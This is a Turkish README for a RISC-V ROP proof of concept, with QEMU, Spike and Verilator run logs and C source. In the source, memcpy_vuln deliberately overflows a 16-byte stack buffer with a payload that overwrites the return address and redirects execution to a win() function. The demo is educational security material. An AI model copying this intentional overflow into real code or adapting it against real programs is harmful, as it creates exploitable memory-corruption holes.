## RISC-V ROP PoC

### qemu

####

`make && make qemu` ile qemu'da başlatabilirsiniz:

```
ensargok@Sensei:~/dev/riscv/rop-poc-qemu$ make && make qemu
make: Nothing to be done for 'all'.
qemu-system-riscv64 -machine virt -nographic -bios none -kernel hello
Hello RISC-V (UART)!
PoC
```

#### spike & cvw

aynı şekilde cvw ve spike ile de görebilirsiniz (core-v wally ortamında):

```
ensargok@Sensei:~/dev/cvw/examples/C/rop$ make
riscv64-unknown-elf-gcc -o hello -gdwarf-2 -O\
  -march=rv64gc -mabi=lp64d -mcmodel=medany \
  -nostdlib -static -lm -fno-tree-loop-distribute-patterns \
  -T../common/test.ld -I../common \
  hello.c ../common/crt.S ../common/syscalls.c
riscv64-unknown-elf-objdump -S -d hello > hello.objdump
ensargok@Sensei:~/dev/cvw/examples/C/rop$ spike hello
Hello RISC-V (UART)!
PoC
ensargok@Sensei:~/dev/cvw/examples/C/rop$ wsim --sim verilator rv64gc --elf hello
Config=rv64gc tests=None sim=verilator gui=False args='' params='' define=''
Running Verilator on rv64gc hello
make: Entering directory '/home/ensargok/dev/cvw/sim/verilator'
mkdir -p /home/ensargok/dev/cvw/sim/verilator/logs
/home/ensargok/dev/cvw/sim/verilator/wkdir/rv64gc_hello/Vtestbench +TEST=hello +ElfFile=/home/ensargok/dev/cvw/examples/C/rop/hello
make[1]: Entering directory '/home/ensargok/dev/cvw/sim/verilator'
make[1]: Leaving directory '/home/ensargok/dev/cvw/sim/verilator'
Hello RISC-V (UART)!
PoC
Single Elf file tests are not signatured verified.
- /home/ensargok/dev/cvw/testbench/testbench.sv:472: Verilog $finish
- S i m u l a t i o n   R e p o r t: Verilator 5.044 2026-01-01
- Verilator: $finish at 86ns; walltime 0.255 s; speed 491.238 ns/s
- Verilator: cpu 0.176 s on 1 threads; alloced 327 MB
make: Leaving directory '/home/ensargok/dev/cvw/sim/verilator'
```

#### Kaynak Kodu

```c
/* example function which is not supposed to be called */
void win() {
    printf("PoC\n\r");
    while (1); /* since 'ra' register has the address of this function */
               /* every 'ret' will call this function again which will */
               /* loop forever. */
}

void memcpy_(char *src, char *target, int size) {
    int i = 0;
    while (i < size) {
        target[i++] = *src++;
    }
}

void memcpy_vuln(char *target) {
    /* example payload for buffer overflow */
    /* 0x8000006c is the address of the win function */
    /* make sure 'ra' register gets overriten by this address */
    memcpy_("AAAAAAAABBBBBBBBDDDDDDDD\xc6\x01\x00\x80\x00\x00\x00\x00", target, 32);
}

int main() {
    /* 16 bytes of buffer */
    char arr[16];

    printf("Hello RISC-V (UART)!\n\r");
    /* arbitary size of input */
    memcpy_vuln(arr);

    return 0;
}
```
